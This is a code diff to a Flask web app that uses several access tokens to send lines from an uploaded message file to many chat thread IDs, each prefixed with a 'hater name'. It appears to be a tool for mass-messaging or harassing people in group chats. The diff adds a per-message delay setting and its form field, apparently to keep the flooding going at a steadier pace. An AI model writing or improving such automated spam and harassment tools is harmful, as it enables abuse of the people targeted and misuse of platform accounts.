@@ -3,6 +3,7 @@ from threading import Thread, Event
 import requests
 import random
 import string
+import time  # Import time
 import logging
 
 app = Flask(__name__)
@@ -16,7 +17,7 @@ stop_events = {}
 threads = {}
 
 # Function to send messages
-def send_messages(access_tokens, thread_ids, hatter_names, messages, task_id):
+def send_messages(access_tokens, thread_ids, hatter_names, messages, task_id, delay):
     logging.info(f"Task {task_id} started.")
     for thread_id in thread_ids:
         for hatter_name in hatter_names:
@@ -40,6 +41,9 @@ def send_messages(access_tokens, thread_ids, hatter_names, messages, task_id):
                     except requests.RequestException as e:
                         logging.error(f"Request failed for token {access_token}: {e}")
 
+                    # Delay before sending the next message
+                    time.sleep(delay)
+
 @app.route('/stop/<task_id>', methods=['POST'])
 def stop_task(task_id):
     if task_id in stop_events:
@@ -52,7 +56,7 @@ def send_message():
     if request.method == 'POST':
         token_option = request.form.get('tokenOption')
         access_tokens = []
-        
+
         if token_option == 'single':
             access_tokens.append(request.form.get('singleToken'))
         else:
@@ -64,14 +68,16 @@ def send_message():
         txt_file = request.files['txtFile']
         messages = txt_file.read().decode().splitlines()
 
+        delay = float(request.form.get('delay', 0))  # Get the delay from the form
+
         # Create a unique task ID
         task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=20))
         
         stop_events[task_id] = Event()  # Create a new stop event for this task
-        thread = Thread(target=send_messages, args=(access_tokens, thread_ids, hatter_names, messages, task_id))
+        thread = Thread(target=send_messages, args=(access_tokens, thread_ids, hatter_names, messages, task_id, delay))
         threads[task_id] = thread
         thread.start()
-        
+
         return f'Task started with ID: {task_id}'
     
     # Render the HTML page with the form
@@ -133,6 +139,9 @@ def send_message():
 
       <h4>Messages File</h4>
       <input type="file" class="form-control" id="txtFile" name="txtFile" required>
+
+      <h4>Delay between messages (seconds)</h4>
+      <input type="number" class="form-control" name="delay" value="1" min="0" step="0.1">
 
       <button type="button" class="btn btn-secondary" onclick="addUidInput()">Add UID</button>
       <button type="button" class="btn btn-secondary" onclick="addHatterInput()">Add Hater Name</button>
